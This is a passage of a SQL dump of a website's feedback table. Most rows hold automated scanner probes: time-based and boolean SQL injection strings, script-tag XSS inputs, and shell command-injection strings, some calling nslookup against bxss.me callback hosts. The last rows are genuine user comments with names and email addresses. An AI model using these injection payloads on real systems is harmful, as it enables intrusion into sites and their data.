--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:29','2021-06-14 17:45:29'),(165,'Question','1','Http://bxss.me/t/fit.txt','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:30','2021-06-14 17:45:30'),(166,'Question','-1 OR 2+471-471-1=0+0+0+1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:30','2021-06-14 17:45:30'),(167,'Question','1','http://bxss.me/t/fit.txt?.jpg','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:30','2021-06-14 17:45:30'),(168,'Question','-1\' OR 2+276-276-1=0+0+0+1 --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:30','2021-06-14 17:45:30'),(169,'Question','1','bxss.me','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:31','2021-06-14 17:45:31'),(170,'Question','-1\' OR 2+754-754-1=0+0+0+1 or \'BGrgmcpU\'=\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:31','2021-06-14 17:45:31'),(171,'Question','1','HfjNUlYZ','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','sample@email.tst','2021-06-14 17:45:31','2021-06-14 17:45:31'),(172,'echo iuouod$()\\ vvxead\\nz^xyu||a #\' &echo iuouod$()\\ vvxead\\nz^xyu||a #|\" &echo iuouod$()\\ vvxead\\nz^xyu||a #','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:31','2021-06-14 17:45:31'),(173,'Question','-1\" OR 2+811-811-1=0+0+0+1 --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:31','2021-06-14 17:45:31'),(174,'Question','1','HfjNUlYZ','1some_inexistent_file_with_long_name\0.jpg','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(175,'&echo yuqkwo$()\\ mpwkhn\\nz^xyu||a #\' &echo yuqkwo$()\\ mpwkhn\\nz^xyu||a #|\" &echo yuqkwo$()\\ mpwkhn\\nz^xyu||a #','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(176,'Question','826\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(177,'Question','1','HfjNUlYZ','Http://bxss.me/t/fit.txt','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(178,'|echo vutqyq$()\\ rlyzxq\\nz^xyu||a #\' |echo vutqyq$()\\ rlyzxq\\nz^xyu||a #|\" |echo vutqyq$()\\ rlyzxq\\nz^xyu||a #','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(179,'Question','if(now()=sysdate(),sleep(12),0)','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:32','2021-06-14 17:45:32'),(180,'(nslookup hitsrujdhtnjw355f1.bxss.me||perl -e \"gethostbyname(\'hitsrujdhtnjw355f1.bxss.me\')\")','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(181,'Question','0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(182,'Question','1','HfjNUlYZ','http://bxss.me/t/fit.txt?.jpg','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(183,'$(nslookup hitafyqdsntebd4f51.bxss.me||perl -e \"gethostbyname(\'hitafyqdsntebd4f51.bxss.me\')\")','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(184,'Question','1','HfjNUlYZ','bxss.me','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(185,'Question','0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:33','2021-06-14 17:45:33'),(186,'&(nslookup hitumoskducqg179e6.bxss.me||perl -e \"gethostbyname(\'hitumoskducqg179e6.bxss.me\')\")&\'\\\"`0&(nslookup hitumoskducqg179e6.bxss.me||perl -e \"gethostbyname(\'hitumoskducqg179e6.bxss.me\')\")&`\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:34','2021-06-14 17:45:34'),(187,'Question','(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:34','2021-06-14 17:45:34'),(188,'|(nslookup hitxotmylxwuqbeefa.bxss.me||perl -e \"gethostbyname(\'hitxotmylxwuqbeefa.bxss.me\')\")','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:34','2021-06-14 17:45:34'),(189,'Question','feedbacks','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:34','2021-06-14 17:45:34'),(190,'Question','-1; waitfor delay \'0:0:12\' --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:34','2021-06-14 17:45:34'),(191,'`(nslookup hitxnslzevflld0858.bxss.me||perl -e \"gethostbyname(\'hitxnslzevflld0858.bxss.me\')\")`','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:35','2021-06-14 17:45:35'),(192,'Question','feedbacks','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:35','2021-06-14 17:45:35'),(193,'Question','-1); waitfor delay \'0:0:12\' --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:35','2021-06-14 17:45:35'),(194,'Question','1 waitfor delay \'0:0:12\' --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:35','2021-06-14 17:45:35'),(195,'Question','feedbacks/.','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:35','2021-06-14 17:45:35'),(196,'Question','1\'\"()&%<acx><ScRiPt >6fUD(9045)</ScRiPt>','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(197,'Question','1','echo lcsxfq$()\\ guvcpm\\nz^xyu||a #\' &echo lcsxfq$()\\ guvcpm\\nz^xyu||a #|\" &echo lcsxfq$()\\ guvcpm\\nz^xyu||a #','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(198,'Question','buIrLYQ1\'; waitfor delay \'0:0:12\' --','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(199,'Question','1','HfjNUlYZ','HfjNUlYZ','feedbacks','2021-06-14 17:45:36','2021-06-14 17:45:36'),(200,'Question','\'\"()&%<acx><ScRiPt >6fUD(9268)</ScRiPt>','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(201,'Question','1','&echo nlpyvt$()\\ ssfhig\\nz^xyu||a #\' &echo nlpyvt$()\\ ssfhig\\nz^xyu||a #|\" &echo nlpyvt$()\\ ssfhig\\nz^xyu||a #','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(202,'Question','1','HfjNUlYZ','HfjNUlYZ','feedbacks','2021-06-14 17:45:36','2021-06-14 17:45:36'),(203,'Question','-5 OR 266=(SELECT 266 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(204,'Question','19545276','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:36','2021-06-14 17:45:36'),(205,'Question','1','|echo uvemxb$()\\ yjcydn\\nz^xyu||a #\' |echo uvemxb$()\\ yjcydn\\nz^xyu||a #|\" |echo uvemxb$()\\ yjcydn\\nz^xyu||a #','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:37','2021-06-14 17:45:37'),(206,'Question','1','HfjNUlYZ','HfjNUlYZ','feedbacks/.','2021-06-14 17:45:37','2021-06-14 17:45:37'),(207,'Question','-5) OR 359=(SELECT 359 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:37','2021-06-14 17:45:37'),(208,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst\'\"()&%<acx><ScRiPt >6fUD(9849)</ScRiPt>','2021-06-14 17:45:37','2021-06-14 17:45:37'),(209,'Question','1','(nslookup hitlrdhajvxah4c173.bxss.me||perl -e \"gethostbyname(\'hitlrdhajvxah4c173.bxss.me\')\")','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:37','2021-06-14 17:45:37'),(210,'Question','-1)) OR 661=(SELECT 661 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:37','2021-06-14 17:45:37'),(211,'feedbacks','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:37','2021-06-14 17:45:37'),(212,'Question','1','HfjNUlYZ','HfjNUlYZ','\'\"()&%<acx><ScRiPt >6fUD(9875)</ScRiPt>','2021-06-14 17:45:37','2021-06-14 17:45:37'),(213,'Question','1','$(nslookup hiteehedevwbh87aac.bxss.me||perl -e \"gethostbyname(\'hiteehedevwbh87aac.bxss.me\')\")','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(214,'feedbacks','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(215,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst9888553','2021-06-14 17:45:38','2021-06-14 17:45:38'),(216,'Question','1','&(nslookup hityrldmbjhzz6b563.bxss.me||perl -e \"gethostbyname(\'hityrldmbjhzz6b563.bxss.me\')\")&\'\\\"`0&(nslookup hityrldmbjhzz6b563.bxss.me||perl -e \"gethostbyname(\'hityrldmbjhzz6b563.bxss.me\')\")&`\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(217,'feedbacks/.','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(218,'Question\'\"()&%<acx><ScRiPt >6fUD(9228)</ScRiPt>','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(219,'Question','1O6QWc2K\' OR 482=(SELECT 482 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:38','2021-06-14 17:45:38'),(220,'Question','1','|(nslookup hitmrfadpkgok5d330.bxss.me||perl -e \"gethostbyname(\'hitmrfadpkgok5d330.bxss.me\')\")','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(221,'Question','1','feedbacks','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(222,'\'\"()&%<acx><ScRiPt >6fUD(9374)</ScRiPt>','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(223,'Question','1','`(nslookup hitpjvrilgnvd85454.bxss.me||perl -e \"gethostbyname(\'hitpjvrilgnvd85454.bxss.me\')\")`','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(224,'Question','1','feedbacks','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(225,'Question9397034','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:39','2021-06-14 17:45:39'),(226,'Question','D0w36eVy\') OR 122=(SELECT 122 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(227,'Question','1','HfjNUlYZ\'\"()&%<acx><ScRiPt >6fUD(9872)</ScRiPt>','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(228,'Question','1','feedbacks/.','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(229,'Question','dMp1s5v0\')) OR 585=(SELECT 585 FROM PG_SLEEP(12))--','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(230,'Question','1','HfjNUlYZ','echo pijbfb$()\\ thawal\\nz^xyu||a #\' &echo pijbfb$()\\ thawal\\nz^xyu||a #|\" &echo pijbfb$()\\ thawal\\nz^xyu||a #','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(231,'Question','1','\'\"()&%<acx><ScRiPt >6fUD(9030)</ScRiPt>','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(232,'Question','1','HfjNUlYZ','feedbacks','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(233,'Question','1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),12)','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:40','2021-06-14 17:45:40'),(234,'Question','1','HfjNUlYZ','&echo gwlkjz$()\\ avxpxq\\nz^xyu||a #\' &echo gwlkjz$()\\ avxpxq\\nz^xyu||a #|\" &echo gwlkjz$()\\ avxpxq\\nz^xyu||a #','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(235,'Question','1','HfjNUlYZ','feedbacks','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(236,'Question','1\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(237,'Question','1','HfjNUlYZ9183482','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(238,'Question','1','HfjNUlYZ','|echo yhhyef$()\\ lrlcxx\\nz^xyu||a #\' |echo yhhyef$()\\ lrlcxx\\nz^xyu||a #|\" |echo yhhyef$()\\ lrlcxx\\nz^xyu||a #','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(239,'Question','1','HfjNUlYZ','feedbacks/.','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(240,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(241,'Question','1','HfjNUlYZ','HfjNUlYZ\'\"()&%<acx><ScRiPt >6fUD(9096)</ScRiPt>','sample@email.tst','2021-06-14 17:45:41','2021-06-14 17:45:41'),(242,'Question','1','HfjNUlYZ','(nslookup hitprpgoznpqf08528.bxss.me||perl -e \"gethostbyname(\'hitprpgoznpqf08528.bxss.me\')\")','sample@email.tst','2021-06-14 17:45:42','2021-06-14 17:45:42'),(243,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:45:42','2021-06-14 17:45:42'),(244,'Question','1','HfjNUlYZ','\'\"()&%<acx><ScRiPt >6fUD(9901)</ScRiPt>','sample@email.tst','2021-06-14 17:45:42','2021-06-14 17:45:42'),(245,'Question','1','HfjNUlYZ','$(nslookup hitshsizupgusa29f7.bxss.me||perl -e \"gethostbyname(\'hitshsizupgusa29f7.bxss.me\')\")','sample@email.tst','2021-06-14 17:45:42','2021-06-14 17:45:42'),(246,'Question','1','HfjNUlYZ','HfjNUlYZ','-1 OR 2+749-749-1=0+0+0+1 --','2021-06-14 17:45:42','2021-06-14 17:45:42'),(247,'Question','1','HfjNUlYZ','HfjNUlYZ9628799','sample@email.tst','2021-06-14 17:45:42','2021-06-14 17:45:42'),(248,'Question','1','HfjNUlYZ','&(nslookup hiteskmitvibf92a97.bxss.me||perl -e \"gethostbyname(\'hiteskmitvibf92a97.bxss.me\')\")&\'\\\"`0&(nslookup hiteskmitvibf92a97.bxss.me||perl -e \"gethostbyname(\'hiteskmitvibf92a97.bxss.me\')\")&`\'','sample@email.tst','2021-06-14 17:45:43','2021-06-14 17:45:43'),(249,'Question','1','HfjNUlYZ','HfjNUlYZ','-1 OR 2+332-332-1=0+0+0+1','2021-06-14 17:45:43','2021-06-14 17:45:43'),(250,'Question','1','HfjNUlYZ','|(nslookup hitihppogfiiz32650.bxss.me||perl -e \"gethostbyname(\'hitihppogfiiz32650.bxss.me\')\")','sample@email.tst','2021-06-14 17:45:43','2021-06-14 17:45:43'),(251,'Question','1','HfjNUlYZ','HfjNUlYZ','-1\' OR 2+977-977-1=0+0+0+1 --','2021-06-14 17:45:43','2021-06-14 17:45:43'),(252,'Question','1','HfjNUlYZ','`(nslookup hitbslkwsurlg104f7.bxss.me||perl -e \"gethostbyname(\'hitbslkwsurlg104f7.bxss.me\')\")`','sample@email.tst','2021-06-14 17:45:43','2021-06-14 17:45:43'),(253,'Question','1','HfjNUlYZ','HfjNUlYZ','-1\' OR 2+790-790-1=0+0+0+1 or \'1jghUFr6\'=\'','2021-06-14 17:45:44','2021-06-14 17:45:44'),(254,'Question','1','HfjNUlYZ','HfjNUlYZ','-1\" OR 2+185-185-1=0+0+0+1 --','2021-06-14 17:45:44','2021-06-14 17:45:44'),(255,'Question','1','HfjNUlYZ','HfjNUlYZ','64\'','2021-06-14 17:45:45','2021-06-14 17:45:45'),(256,'Question','1','HfjNUlYZ','HfjNUlYZ','if(now()=sysdate(),sleep(12),0)','2021-06-14 17:45:46','2021-06-14 17:45:46'),(257,'Question','1','HfjNUlYZ','HfjNUlYZ','0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z','2021-06-14 17:45:47','2021-06-14 17:45:47'),(258,'Question','1','HfjNUlYZ','HfjNUlYZ','0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z','2021-06-14 17:45:48','2021-06-14 17:45:48'),(259,'Question','1','HfjNUlYZ','HfjNUlYZ','(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/','2021-06-14 17:45:50','2021-06-14 17:45:50'),(260,'Question','1','HfjNUlYZ','HfjNUlYZ','1 waitfor delay \'0:0:12\' --','2021-06-14 17:45:52','2021-06-14 17:45:52'),(261,'Question','1','HfjNUlYZ','HfjNUlYZ','eiAqnXJ2\'; waitfor delay \'0:0:12\' --','2021-06-14 17:45:54','2021-06-14 17:45:54'),(262,'Question','1','HfjNUlYZ','HfjNUlYZ','vdjZ51TU\' OR 226=(SELECT 226 FROM PG_SLEEP(12))--','2021-06-14 17:45:55','2021-06-14 17:45:55'),(263,'Question','1','HfjNUlYZ','HfjNUlYZ','g22nt1RH\') OR 800=(SELECT 800 FROM PG_SLEEP(12))--','2021-06-14 17:45:57','2021-06-14 17:45:57'),(264,'Question','1','HfjNUlYZ','HfjNUlYZ','el7wWtly\')) OR 660=(SELECT 660 FROM PG_SLEEP(12))--','2021-06-14 17:45:58','2021-06-14 17:45:58'),(265,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'','2021-06-14 17:46:00','2021-06-14 17:46:00'),(266,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:02','2021-06-14 17:46:02'),(267,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:04','2021-06-14 17:46:04'),(268,'-1 OR 2+485-485-1=0+0+0+1 --','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:06','2021-06-14 17:46:06'),(269,'-1 OR 2+320-320-1=0+0+0+1','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:06','2021-06-14 17:46:06'),(270,'-1\' OR 2+675-675-1=0+0+0+1 --','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:07','2021-06-14 17:46:07'),(271,'-1\' OR 2+685-685-1=0+0+0+1 or \'BNPTEdCf\'=\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:07','2021-06-14 17:46:07'),(272,'-1\" OR 2+778-778-1=0+0+0+1 --','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:08','2021-06-14 17:46:08'),(273,'647\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:08','2021-06-14 17:46:08'),(274,'if(now()=sysdate(),sleep(12),0)','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:10','2021-06-14 17:46:10'),(275,'0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:12','2021-06-14 17:46:12'),(276,'0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:15','2021-06-14 17:46:15'),(277,'(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:17','2021-06-14 17:46:17'),(278,'1 waitfor delay \'0:0:12\' --','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:19','2021-06-14 17:46:19'),(279,'qFmYcuLe\'; waitfor delay \'0:0:12\' --','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:21','2021-06-14 17:46:21'),(280,'qjin9MZA\' OR 762=(SELECT 762 FROM PG_SLEEP(12))--','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:23','2021-06-14 17:46:23'),(281,'XMx3qJs8\') OR 580=(SELECT 580 FROM PG_SLEEP(12))--','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:25','2021-06-14 17:46:25'),(282,'OY5CJbNc\')) OR 669=(SELECT 669 FROM PG_SLEEP(12))--','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:27','2021-06-14 17:46:27'),(283,'Question\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:30','2021-06-14 17:46:30'),(284,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:33','2021-06-14 17:46:33'),(285,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:37','2021-06-14 17:46:37'),(286,'Question','1','-1 OR 2+722-722-1=0+0+0+1 --','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:37','2021-06-14 17:46:37'),(287,'Question','1','-1 OR 2+124-124-1=0+0+0+1','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:38','2021-06-14 17:46:38'),(288,'Question','1','-1\' OR 2+718-718-1=0+0+0+1 --','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:38','2021-06-14 17:46:38'),(289,'Question','1','-1\' OR 2+391-391-1=0+0+0+1 or \'wDEEWOux\'=\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:39','2021-06-14 17:46:39'),(290,'Question','1','-1\" OR 2+118-118-1=0+0+0+1 --','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:39','2021-06-14 17:46:39'),(291,'Question','1','73\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:40','2021-06-14 17:46:40'),(292,'Question','1','if(now()=sysdate(),sleep(12),0)','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:43','2021-06-14 17:46:43'),(293,'Question','1','0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:45','2021-06-14 17:46:45'),(294,'Question','1','0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:49','2021-06-14 17:46:49'),(295,'Question','1','(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:52','2021-06-14 17:46:52'),(296,'Question','1','1 waitfor delay \'0:0:12\' --','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:55','2021-06-14 17:46:55'),(297,'Question','1','S8Dm6is9\'; waitfor delay \'0:0:12\' --','HfjNUlYZ','sample@email.tst','2021-06-14 17:46:58','2021-06-14 17:46:58'),(298,'Question','1','qm9o7gMI\' OR 373=(SELECT 373 FROM PG_SLEEP(12))--','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:01','2021-06-14 17:47:01'),(299,'Question','1','MHBs0X2u\') OR 628=(SELECT 628 FROM PG_SLEEP(12))--','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:05','2021-06-14 17:47:05'),(300,'Question','1','DOk8qUtS\')) OR 285=(SELECT 285 FROM PG_SLEEP(12))--','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:08','2021-06-14 17:47:08'),(301,'Question','1','HfjNUlYZ\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:10','2021-06-14 17:47:10'),(302,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:13','2021-06-14 17:47:13'),(303,'Question','1','HfjNUlYZ','HfjNUlYZ','sample@email.tst','2021-06-14 17:47:16','2021-06-14 17:47:16'),(304,'Question','1','HfjNUlYZ','-1 OR 2+680-680-1=0+0+0+1 --','sample@email.tst','2021-06-14 17:47:17','2021-06-14 17:47:17'),(305,'Question','1','HfjNUlYZ','-1 OR 2+664-664-1=0+0+0+1','sample@email.tst','2021-06-14 17:47:17','2021-06-14 17:47:17'),(306,'Question','1','HfjNUlYZ','-1\' OR 2+963-963-1=0+0+0+1 --','sample@email.tst','2021-06-14 17:47:18','2021-06-14 17:47:18'),(307,'Question','1','HfjNUlYZ','-1\' OR 2+618-618-1=0+0+0+1 or \'H94ddCiZ\'=\'','sample@email.tst','2021-06-14 17:47:18','2021-06-14 17:47:18'),(308,'Question','1','HfjNUlYZ','-1\" OR 2+683-683-1=0+0+0+1 --','sample@email.tst','2021-06-14 17:47:19','2021-06-14 17:47:19'),(309,'Question','1','HfjNUlYZ','596\'','sample@email.tst','2021-06-14 17:47:19','2021-06-14 17:47:19'),(310,'Question','1','HfjNUlYZ','if(now()=sysdate(),sleep(12),0)','sample@email.tst','2021-06-14 17:47:23','2021-06-14 17:47:23'),(311,'Question','1','HfjNUlYZ','0\'XOR(if(now()=sysdate(),sleep(12),0))XOR\'Z','sample@email.tst','2021-06-14 17:47:27','2021-06-14 17:47:27'),(312,'Question','1','HfjNUlYZ','0\"XOR(if(now()=sysdate(),sleep(12),0))XOR\"Z','sample@email.tst','2021-06-14 17:47:30','2021-06-14 17:47:30'),(313,'Question','1','HfjNUlYZ','(select(0)from(select(sleep(12)))v)/*\'+(select(0)from(select(sleep(12)))v)+\'\"+(select(0)from(select(sleep(12)))v)+\"*/','sample@email.tst','2021-06-14 17:47:33','2021-06-14 17:47:33'),(314,'Question','1','HfjNUlYZ','1 waitfor delay \'0:0:12\' --','sample@email.tst','2021-06-14 17:47:37','2021-06-14 17:47:37'),(315,'Question','1','HfjNUlYZ','1XItSyeB\'; waitfor delay \'0:0:12\' --','sample@email.tst','2021-06-14 17:47:41','2021-06-14 17:47:41'),(316,'Question','1','HfjNUlYZ','tNxJKu0V\' OR 539=(SELECT 539 FROM PG_SLEEP(12))--','sample@email.tst','2021-06-14 17:47:45','2021-06-14 17:47:45'),(317,'Question','1','HfjNUlYZ','1R8qkw0L\') OR 863=(SELECT 863 FROM PG_SLEEP(12))--','sample@email.tst','2021-06-14 17:47:50','2021-06-14 17:47:50'),(318,'Question','1','HfjNUlYZ','sFm8nzGC\')) OR 212=(SELECT 212 FROM PG_SLEEP(12))--','sample@email.tst','2021-06-14 17:47:55','2021-06-14 17:47:55'),(319,'Question','1','HfjNUlYZ','HfjNUlYZ\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),12)||\'','sample@email.tst','2021-06-14 17:47:58','2021-06-14 17:47:58'),(320,'Comments','I first thank the ministry for uploading student texts that can be accessed on free basis.But, grade 8 physics is missing;grade 7 physics appears when downloaded.','Girma','Kebede','girmayyekebede@gmail.com','2021-07-05 06:31:11','2021-07-05 06:31:11'),(321,'Comments','I first thank the ministry for uploading student texts that can be accessed on free basis.But, grade 8 physics is missing;grade 7 physics appears when downloaded.','Girma','Kebede','girmayyekebede@gmail.com','2021-07-05 06:49:18','2021-07-05 06:49:18'),(322,'Comments','I first thank the ministry for uploading student texts that can be accessed on free basis.But, grade 8 physics is missing;grade 7 physics appears when downloaded.','Girma','Kebede','girmayyekebede@gmail.com','2021-07-05 06:49:48','2021-07-05 06:49:48'),(323,'Comments','your web site is good but it include buttons that are not functional so you should remove it or make it functional','zebene','damitie','zebenehabite27@gmail.com','2021-07-07 17:25:50','2021-07-07 17:25:50'),(324,'Comments','What is wrong with the registration page? The pho code is appearing on it have a look.','Cazod','Zimber','Cazodzimber@gmail.com','2021-07-13 22:18:24','2021-07-13 22:18:24'),(325,'Comments','Wow it is good ideas','yidersal','Habtam','Betiyidersal@gmail.com','2021-07-29 